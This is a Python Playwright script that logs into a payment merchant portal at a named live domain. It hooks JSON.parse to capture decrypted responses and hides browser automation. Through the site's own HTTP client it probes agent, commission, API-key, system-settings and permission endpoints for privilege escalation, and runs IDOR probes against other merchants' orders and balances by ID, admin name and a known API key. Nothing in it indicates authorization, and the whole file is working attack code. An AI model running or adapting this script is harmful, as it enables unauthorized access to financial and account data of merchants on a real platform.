import asyncio, json, os, sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")

from playwright.async_api import async_playwright

CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
TARGET = "https://merchant.lamuzhifu.top"
OUT = r"E:\IOSusdt"
PROXY = "http://127.0.0.1:10809"
LOGIN, PASSWD = "\u51a0\u519b", "<REDACTED_PASSWORD>"

INIT = r"""
window.__PLAIN = [];
window.__RES = [];
(function () {
  const oParse = JSON.parse;
  window.JSON.parse = function (t, r) {
    const v = oParse.call(this, t, r);
    try {
      if (v && typeof v === 'object' && !Array.isArray(v) && !(v.v === 3 && v.p && v.q))
        window.__PLAIN.push(v);
    } catch (e) {}
    return v;
  };
  // Replay helper: use the app's own crypto pipeline by issuing fetch with the
  // gate headers copied from a real request. Expose a hook for the driver.
  window.__CALL = async function (method, path, body, auth) {
    const h = { 'Accept': 'application/json, text/plain, */*' };
    if (auth) h['Authorization'] = auth;
    if (body !== null && body !== undefined) h['Content-Type'] = 'application/json';
    const r = await fetch(path, { method: method, headers: h,
                                  body: body !== null && body !== undefined ? JSON.stringify(body) : undefined });
    const t = await r.text();
    return { status: r.status, text: t };
  };
})();
"""


async def do_login(pg):
    await pg.goto(TARGET + "/login", wait_until="commit", timeout=60000)
    for i in range(40):
        await pg.wait_for_timeout(1000)
        try:
            d = await pg.evaluate("""() => ({ w: window.__cx?window.__cx.w:null,
                cxp: window.__cxp||null, n: document.querySelectorAll('input').length })""")
        except Exception:
            continue
        if d and d["w"] == 1 and d["cxp"] == 1 and d["n"] >= 3:
            break
    await pg.wait_for_timeout(2000)
    await pg.evaluate("""async (c) => {
        const set=(el,v)=>{const d=Object.getOwnPropertyDescriptor(el.__proto__,'value');
          d&&d.set?d.set.call(el,v):(el.value=v);
          el.dispatchEvent(new Event('input',{bubbles:true}));
          el.dispatchEvent(new Event('change',{bubbles:true}));};
        const ins=Array.from(document.querySelectorAll('input'));
        const u=ins.find(i=>i.name==='username'||i.type==='text');
        const pw=ins.find(i=>i.name==='password'||i.type==='password');
        const tt=ins.find(i=>i.name==='Totp');
        if(u)set(u,c.u); if(pw)set(pw,c.p); if(tt)set(tt,'');
        await new Promise(r=>setTimeout(r,700));
        const bs=Array.from(document.querySelectorAll('button'));
        const btn=bs.find(x=>/\\u767b\\u5f55/.test(x.innerText))||bs[0];
        if(btn)btn.click(); }""", {"u": LOGIN, "p": PASSWD})
    for i in range(45):
        await pg.wait_for_timeout(1000)
        t = await pg.evaluate("() => localStorage.getItem('merchant-token')||''")
        if t:
            print(f"[+] login ok ~{i+1}s")
            return t
    return ""


# Endpoints to test for horizontal/vertical privilege escalation with a merchant token
TESTS = [
    # (method, path, body, expectation)
    ("GET",  "/api/Agent/Subordinates", None, "代理商下级商户"),
    ("POST", "/api/Agent/Subordinates", {"Pager": {"PageIndex": 1, "PageSize": 50}, "Condition": {}}, "代理商下级商户"),
    ("GET",  "/api/Home/AgentDashboard", None, "代理仪表盘"),
    ("POST", "/api/AgentDailyReport/List", {"Pager": {"PageIndex": 1, "PageSize": 50}, "Condition": {}}, "代理日报"),
    ("POST", "/api/AgentReviewMerchantOrderList/List", {"Pager": {"PageIndex": 1, "PageSize": 50}, "Condition": {}}, "代理审核商户订单"),
    ("POST", "/api/Commission/List", {"Pager": {"PageIndex": 1, "PageSize": 50}, "Condition": {}}, "佣金列表"),
    ("POST", "/api/CommissionSettlement/List", {"Pager": {"PageIndex": 1, "PageSize": 50}, "Condition": {}}, "佣金结算"),
    ("GET",  "/api/CommissionSettlement/Balance", None, "佣金余额"),
    ("POST", "/api/BalanceRecord/List", {"Pager": {"PageIndex": 1, "PageSize": 50}, "Condition": {}}, "资金流水"),
    ("POST", "/api/Transaction/List", {"Pager": {"PageIndex": 1, "PageSize": 50}, "Condition": {}}, "交易流水"),
    ("POST", "/api/MerchantOrder/List", {"Pager": {"PageIndex": 1, "PageSize": 50}, "Condition": {}}, "商户订单"),
    ("POST", "/api/MerchantDailyReport/List", {"Pager": {"PageIndex": 1, "PageSize": 50}, "Condition": {}}, "商户日报"),
    ("GET",  "/api/MerchantChannel/List", None, "商户通道"),
    ("GET",  "/api/ApiKey/List", None, "API密钥"),
    ("GET",  "/api/AuthorizedIp/List", None, "IP白名单"),
    ("GET",  "/api/System/Settings", None, "系统设置"),
    ("GET",  "/api/Permission/Query", None, "权限查询"),
    # IDOR probes on obvious object ids
    ("POST", "/api/BalanceRecord/List", {"Pager": {"PageIndex": 1, "PageSize": 50},
                                          "Condition": {"MerchantId": 1}}, "资金流水 (MerchantId=1)"),
    ("POST", "/api/MerchantOrder/List", {"Pager": {"PageIndex": 1, "PageSize": 50},
                                          "Condition": {"MerchantId": 1}}, "商户订单 (MerchantId=1)"),
    ("POST", "/api/MerchantOrder/List", {"Pager": {"PageIndex": 1, "PageSize": 50},
                                          "Condition": {"MerchantLoginName": "admin"}}, "商户订单 (admin)"),
    ("POST", "/api/Transaction/List", {"Pager": {"PageIndex": 1, "PageSize": 50},
                                        "Condition": {"MerchantNo": "<REDACTED_ACCESSKEY>"}}, "交易 (已知APIKey)"),
]


async def main():
    async with async_playwright() as p:
        b = await p.chromium.launch(
            headless=False, executable_path=CHROME, proxy={"server": PROXY},
            args=["--ignore-certificate-errors", "--no-sandbox",
                  "--disable-blink-features=AutomationControlled", "--window-size=1920,1080"])
        ctx = await b.new_context(ignore_https_errors=True,
                                  viewport={"width": 1920, "height": 1080},
                                  screen={"width": 1920, "height": 1080})
        await ctx.add_init_script(INIT)
        pg = await ctx.new_page()
        tok = await do_login(pg)
        if not tok:
            print("[!] login failed"); await b.close(); return
        await pg.wait_for_timeout(4000)

        # First: do a normal page load so the gate headers get minted, then read them
        await pg.goto(TARGET + "/dashboard", wait_until="commit", timeout=35000)
        await pg.wait_for_timeout(6000)

        results = []
        print("\n" + "=" * 96)
        print(f"{'METHOD':6s} {'ENDPOINT':50s} {'ST':>4s}  {'TAG':22s} RESULT")
        print("=" * 96)
        for method, path, body, tag in TESTS:
            # Route through the page so interceptors add X-Ch/X-Ck/X-Ws + encrypt
            r = await pg.evaluate(r"""async (a) => {
                const out = { status: null, text: '', plain: null };
                // find an axios-like client the SPA installed
                const cands = [];
                for (const k of ['$http','http','request','axios','service']) {
                  if (window[k] && typeof window[k] === 'function') cands.push(window[k]);
                  if (window[k] && typeof window[k].request === 'function') cands.push(window[k]);
                  if (window[k] && typeof window[k].post === 'function') cands.push(window[k]);
                }
                const el = document.querySelector('#app');
                const app = el && el.__vue_app__;
                if (app && app.config && app.config.globalProperties) {
                  const gp = app.config.globalProperties;
                  for (const k of Object.keys(gp)) {
                    const v = gp[k];
                    if (v && (typeof v.request === 'function' ||
                             (typeof v.get === 'function' && typeof v.post === 'function'))) cands.push(v);
                  }
                }
                if (!cands.length) return { status: -2, text: 'no client', plain: null };
                const c = cands[0];
                try {
                  let res;
                  if (typeof c.request === 'function') {
                    res = await c.request({ url: a.p, method: a.m, data: a.b,
                                            headers: { 'Accept': 'application/json' } });
                  } else if (a.m === 'GET') {
                    res = await c.get(a.p);
                  } else {
                    res = await c.post(a.p, a.b);
                  }
                  out.status = res.status;
                  out.plain = JSON.stringify(res.data).slice(0, 900);
                  out.text = JSON.stringify(res.data).slice(0, 900);
                } catch (e) {
                  const rr = e && e.response;
                  out.status = rr ? rr.status : -1;
                  out.plain = JSON.stringify(rr ? rr.data : String(e)).slice(0, 900);
                  out.text = out.plain;
                }
                return out;
            }""", {"m": method, "p": path, "b": body})
            txt = (r.get("plain") or r.get("text") or "").replace("\n", " ")
            results.append({"method": method, "path": path, "tag": tag,
                            "status": r["status"], "resp": txt})
            print(f"{method:6s} {path:50s} {r['status']:>4}  {tag:22s} {txt[:110]}")

        json.dump(results, open(os.path.join(OUT, "priv_esc.json"), "w", encoding="utf-8"),
                  ensure_ascii=False, indent=1)
        print("\n[+] priv_esc.json saved")
        await b.close()


asyncio.run(main())
